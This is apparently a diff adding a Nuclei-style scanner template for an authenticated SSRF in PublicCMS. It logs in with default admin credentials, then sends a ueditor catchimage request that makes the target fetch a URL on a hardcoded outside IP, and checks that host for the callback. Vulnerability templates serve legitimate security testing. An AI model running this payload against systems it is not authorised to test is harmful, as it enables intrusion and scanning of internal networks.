@@ -1,0 +1,55 @@
+id: publiccms-auth-ssrf
+
+info:
+  name: PublicCMS 202011 Auth SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    PublicCMS is an open-source content management system (CMS) written in Java. An SSRF vulnerability was discovered in the version of PublicCMS-V4.0.202011.b. Attackers can exploit this vulnerability to scan internal network hosts and ports, exploit internal network vulnerabilities, and potentially gain control of the server system.
+  tags: ssrf
+  reference:
+    - https://github.com/sanluan/PublicCMS/issues/51
+
+variables:
+  random_hex: "{{rand_text_alphanumeric(16)}}"
+
+http:
+  - raw:
+      - |
+        POST /admin/login.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin&returnUrl=%2Fadmin%2F
+    extractors:
+      - type: regex
+        name: jsessionid
+        part: header
+        internal: true
+        regex:
+          - "Set-Cookie:\\s*JSESSIONID=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - raw:
+      - |
+        GET /admin/ueditor?action=catchimage&file%5b%5d=http://165.22.59.16/api/v1/poc_scan/{{random_hex}} HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID={{jsessionid}}
+
+  - raw:
+      - |
+        GET /api/v1/poc_scan/get_result?filter={{random_hex}} HTTP/1.1
+        Host: 165.22.59.16:80
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "ok"
+          - "time"
+        part: body
+      - type: status
+        status:
+          - 200
